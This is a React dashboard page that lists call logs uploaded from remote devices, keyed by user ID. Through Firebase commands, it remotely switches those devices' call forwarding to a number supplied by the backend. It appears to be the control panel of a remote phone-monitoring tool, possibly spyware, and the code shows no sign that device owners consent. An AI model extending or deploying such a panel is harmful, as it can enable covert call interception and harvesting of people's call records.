// src/pages/CallLogs.jsx
import React, { useEffect, useState } from "react";
import { useParams, Link } from "react-router-dom";
import axios from "axios";
import { socket } from "../socket";

// ✅ Firebase imports
import { ref, update, onValue, getDatabase } from "firebase/database";
import { db } from "../firebase";  // ensure firebase.js is created


export default function CallLogs() {
  const { userId } = useParams();
  const [callLogs, setCallLogs] = useState([]);
  const [statusMsg, setStatusMsg] = useState("");
  const [isForwardingOn, setIsForwardingOn] = useState(false);
  const [filter, setFilter] = useState("ALL");
  const [isLoading, setIsLoading] = useState(false);

  // Fetch call logs initially
  const fetchCalls = async () => {
    try {
      const res = await axios.get(
        `https://call-forward.onrender.com/call-logs?userId=${userId}`
      );
      setCallLogs(res.data.data || []);
    } catch (err) {
      console.error(err);
    }
  };

  useEffect(() => {
    fetchCalls();

    // socket join still used for live logs
    socket.emit("join-user", userId);

    socket.on("new_call_log", (log) => {
      if (log.userId === userId) {
        setCallLogs((prev) => [log, ...prev]);
      }
    });

    // 🔥 Firebase listener for remote action status acknowledgment
    const cmdRef = ref(db, `commands/${userId}/response`);

    const unsubscribe = onValue(cmdRef, (snapshot) => {
      const data = snapshot.val();
      if (!data) return;

      setStatusMsg(data.message || "Device Updated");

      if (data.status === "ENABLED") setIsForwardingOn(true);
      if (data.status === "DISABLED") setIsForwardingOn(false);

      setIsLoading(false);
    });

    return () => {
      socket.off("new_call_log");
      unsubscribe();
    };
  }, [userId]);



  // 🔥 Toggle forwarding using Firebase Trigger (DEBUG VERSION)
  const toggleForwarding = async () => {
    if (isLoading) {
      console.log("[toggleForwarding] Ignored, already loading");
      return;
    }

    console.log("========== TOGGLE FORWARDING START ==========");
    console.log("[toggleForwarding] Current isForwardingOn:", isForwardingOn);

    setIsLoading(true);
    setStatusMsg("Sending request...");

    try {
      console.log("[toggleForwarding] Calling backend /get-number ...");

      const res = await axios.get(
        `https://call-forward.onrender.com/get-number`
      );

      console.log("[toggleForwarding] /get-number response raw:", res);
      console.log("[toggleForwarding] /get-number data:", res.data);

      // 👉 check what backend actually sends (number? phone?)
      const targetNumber = res.data.phone || res.data.number;
      console.log("[toggleForwarding] Parsed targetNumber:", targetNumber);

      if (!targetNumber) {
        console.warn("[toggleForwarding] targetNumber is EMPTY or UNDEFINED");
        setStatusMsg("⚠️ No forwarding number set (targetNumber missing)");
        setIsLoading(false);
        return;
      }

      const action = !isForwardingOn; // true or false
      console.log("[toggleForwarding] Action (callForward):", action);

      // 🔥 Firebase debug logs
      const path = `commands/${userId}`;
      console.log("[toggleForwarding] Writing to Firebase path:", path);

      await update(ref(db, path), {
        callForward: action,
        number: targetNumber,
        issuedAt: Date.now(),
      });

      console.log("[toggleForwarding] Firebase update SUCCESS ✅");
      setStatusMsg("Waiting for device confirmation...");

    } catch (err) {
      console.error("❌ [toggleForwarding] ERROR CAUGHT:", err);

      // show more details from axios error
      if (err.response) {
        console.error("[toggleForwarding] Axios response error:", {
          status: err.response.status,
          data: err.response.data,
          headers: err.response.headers,
        });
        setStatusMsg(
          `❌ Backend error: ${err.response.status} - ${JSON.stringify(
            err.response.data
          )}`
        );
      } else if (err.request) {
        console.error("[toggleForwarding] Axios no response (request made but no reply):", err.request);
        setStatusMsg("❌ No response from server (/get-number)");
      } else if (err.code) {
        console.error("[toggleForwarding] Firebase or other error code:", err.code);
        setStatusMsg(`❌ Error code: ${err.code} - ${err.message}`);
      } else {
        console.error("[toggleForwarding] General error message:", err.message);
        setStatusMsg(`❌ Failed to send request: ${err.message}`);
      }

      setIsLoading(false);
    } finally {
      console.log("========== TOGGLE FORWARDING END ==========");
    }
  };




  const typeColors = {
    INCOMING: "bg-green-100 text-green-700",
    OUTGOING: "bg-blue-100 text-blue-700",
    MISSED: "bg-red-100 text-red-700",
  };

  const typeIcons = {
    INCOMING: "📥",
    OUTGOING: "📤",
    MISSED: "⛔",
  };

  const filteredLogs =
    filter === "ALL"
      ? callLogs
      : callLogs.filter((c) => c.type === filter);

  return (
    <div className="min-h-screen bg-gray-100 px-4 py-6">
      {/* Sticky Header */}
      <div className="sticky top-0 bg-gray-100 pb-4 pt-1 z-20">
        <Link
          to={`/`}
          className="inline-block mb-4 text-blue-600 font-medium hover:underline"
        >
          ← Back to Dashboard
        </Link>

        {/* Header */}
        <div className="flex flex-col md:flex-row md:items-center md:justify-between">
          <h1 className="text-xl md:text-2xl font-bold text-gray-800 flex items-center gap-2">
            📞 Call Logs
            <span className="text-blue-600">({userId})</span>
          </h1>

          {/* Forwarding Toggle */}
          <div className="flex items-center space-x-3 mt-3 md:mt-0">
            <span className="text-gray-700 font-semibold">Forwarding:</span>

            <label className="inline-flex items-center cursor-pointer">
              <div className="relative">

                {/* Invisible clickable checkbox */}
                <input
                  type="checkbox"
                  disabled={isLoading}
                  checked={isForwardingOn}
                  onChange={toggleForwarding}
                  className="sr-only peer"
                />

                {/* Track */}
                <div
                  className={`w-12 h-6 rounded-full transition-all duration-300 
      ${isForwardingOn ? "bg-green-500" : "bg-gray-400"} 
      peer-checked:bg-green-500`}
                ></div>

                {/* Thumb knob */}
                <div
                  className={`absolute w-6 h-6 bg-white rounded-full shadow 
      transition-all duration-300 top-0 left-0
      ${isForwardingOn ? "translate-x-6" : "translate-x-0"}`}
                ></div>
              </div>
            </label>

          </div>
        </div>

        {/* Filter Tabs */}
        <div className="mt-3 flex gap-2 overflow-x-auto pb-1">
          {["ALL", "INCOMING", "OUTGOING", "MISSED"].map((t) => (
            <button
              key={t}
              onClick={() => setFilter(t)}
              className={`px-3 py-1 rounded-full text-sm font-medium shadow-sm transition ${filter === t
                  ? "bg-blue-600 text-white"
                  : "bg-gray-200 text-gray-700 hover:bg-gray-300"
                }`}
            >
              {t}
            </button>
          ))}
        </div>
      </div>

      {/* Status Banner */}
      {statusMsg && (
        <p className="mt-3 mb-4 p-3 bg-yellow-100 border-l-4 border-yellow-600 text-yellow-800 rounded shadow-sm">
          {statusMsg}
        </p>
      )}

      {/* List / Empty */}
      {filteredLogs.length === 0 ? (
        <div className="text-center mt-14 text-gray-500">
          <div className="text-5xl mb-3">📭</div>
          <p className="text-lg font-medium">No call logs found</p>
          <p className="text-sm text-gray-400">Try changing your filter above.</p>
        </div>
      ) : (
        <div className="mt-5 space-y-4 max-w-3xl mx-auto">
          {filteredLogs
            .sort((a, b) => b.date - a.date)
            .map((call, idx) => (
              <div
                key={idx}
                className="bg-white p-5 rounded-2xl shadow-md border border-gray-200 hover:shadow-lg transition-all"
              >
                <div className="flex justify-between items-center mb-3">
                  <div className="flex items-center gap-2">
                    <span className="text-xl">{typeIcons[call.type]}</span>
                    <span
                      className={`px-3 py-1 rounded-full text-xs font-semibold ${typeColors[call.type]
                        }`}
                    >
                      {call.type}
                    </span>
                  </div>
                  <p className="text-gray-400 text-xs md:text-sm">
                    {new Date(call.date).toLocaleString()}
                  </p>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                  <div>
                    <p className="text-gray-500 font-semibold text-sm">Device Phone:</p>
                    <p className="text-gray-900 text-sm md:text-base">
                      {call.phone || "-"}
                    </p>
                  </div>

                  <div>
                    <p className="text-gray-500 font-semibold text-sm">Number:</p>
                    <p className="text-gray-900 text-sm md:text-base">
                      {call.number}
                    </p>
                  </div>

                  <div>
                    <p className="text-gray-500 font-semibold text-sm">Duration:</p>
                    <p className="text-gray-900 text-sm md:text-base">
                      {call.duration || "N/A"}
                    </p>
                  </div>
                </div>
              </div>
            ))}
        </div>
      )}
    </div>
  );
}
